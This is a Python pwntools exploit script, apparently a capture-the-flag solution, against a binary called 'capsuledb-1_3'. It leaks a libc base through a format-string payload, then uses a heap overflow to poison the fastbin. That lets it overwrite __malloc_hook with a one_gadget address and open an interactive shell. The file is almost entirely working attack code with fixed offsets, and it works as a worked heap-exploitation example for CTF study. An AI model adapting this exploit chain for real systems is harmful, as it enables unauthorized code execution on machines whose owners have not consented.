from pwn import *

elf = context.binary = ELF("./capsuledb-1_3", checksec=False)

proc = process()
#proc = remote("127.0.0.1", 6666)

#gdb.attach(proc,"""continue
#""")

indexcount = 0
def malloc(size,data):
    #sleep(0.1)
    #proc.recvuntil(b"> ")
    proc.sendline(b"1")
    sleep(0.1)
    #proc.recvuntil(b"]: ")
    proc.sendline(b"2")
    sleep(0.1)
    #proc.recvuntil(b"Size: ")
    proc.sendline(f"{size}".encode())
    sleep(0.1)
    #proc.recvuntil(b"Data:")
    proc.sendline(data)
    sleep(0.1)
    #proc.recvlines(10)
    global indexcount
    indexcount = indexcount+1
    return indexcount-1

def free(index):
    #proc.recvuntil(b"> ")
    sleep(0.1)
    proc.sendline(b"3")
    sleep(0.1)
    #proc.recvuntil(b"Index?: ")
    proc.sendline(f"{index}".encode())
    sleep(0.1)

def edit(index,data):
    #proc.recvuntil(b"> ")
    sleep(0.1)
    proc.sendline(b"2")
    #proc.recvuntil(b"Index: ")
    sleep(0.1)
    proc.sendline(f"{index}".encode())
    #proc.recvuntil(b"]: ")
    sleep(0.1)
    proc.sendline(b"2")
    #proc.recvuntil(b"Data:")
    sleep(0.1)
    proc.sendline(data)
    sleep(0.1)
    #proc.recvlines(2)


def view_data(index):
    sleep(0.1)
    proc.sendline(b"4")
    sleep(0.1)
    proc.sendline(f"{index}".encode())
    sleep(0.1)
    proc.sendline(b"2")
    proc.recvuntil(b" *********")
    proc.recvline()
    data=proc.recvline().strip(b"\n")
    return data

def overflow():
    libc = context.binary = ELF("./libc.so.6", checksec=False)
    leak_chunk=malloc(0x68,b"A")
    edit(leak_chunk,b"%3$p") # Libc leak using format string vulnerability, offset 10 leaks a libc address
    libc_leak = view_data(leak_chunk)

    libc_base = int(libc_leak,16) - 0xf73c0 # Libc base address from leak
    libc.address = libc_base

    print(hex(libc_base)) # Libc base

    one_gadget = libc_base + 0xf1247 # One_gadget
    fake_chunk = malloc(0x68,b"/bin/sh -p\x00") # Create a chunk that holds string "/bin/sh", later to be used in system() function

    chunk1=malloc(0x68,b"A") # Create Chunk1
    chunk2=malloc(0x68,b"A") # Create Chunk2
    free(chunk2) # Free Chunk2
    fake_fast = libc.sym.__malloc_hook - 35 # fake fast chunk to bypass fastbin size check. pwndbg> find_fake_fast &__malloc_hook

    edit(chunk1, b"A"*104+p64(0x71)+p64(fake_fast)) # Edit chunk1 to Overwrite userdata of freed Chunk2 using the Overflow bug


    chunk3=malloc(0x68,b"A") # Un-free Chunk2, malloc_hook-35 goes to Fastbin
    chunk4=malloc(0x68,b"B"*19+p64(one_gadget)) # Use malloc_hook address to write one_gadget's address using Arbitrary write
    # malloc writes data or considers chunk's userdata 16-bytes forward of the pointer that's stored in Fastbin. Chunk addr in Fastbin+16 = writable area

    #view_data(fake_chunk)
    malloc(20,b"id") # malloc() -> one_gadget

overflow()




sleep(0.1)
proc.recvuntil(b"6/16\n")
proc.interactive()
